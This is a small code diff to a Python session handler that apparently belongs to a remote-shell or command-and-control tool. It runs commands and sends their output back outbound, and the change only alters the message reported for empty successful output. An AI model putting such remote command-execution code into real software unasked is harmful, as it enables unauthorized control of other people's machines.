@@ -86,7 +86,7 @@ def session_handler():
             output = command.stdout.read() + command.stderr.read()
             return_code = command.wait()
             if not output and return_code == 0:
-                output = 'No output with return code "0"'
+                output = '[*] Success'
                 outbound_message(output)
             else:
                 outbound_message(output.decode())
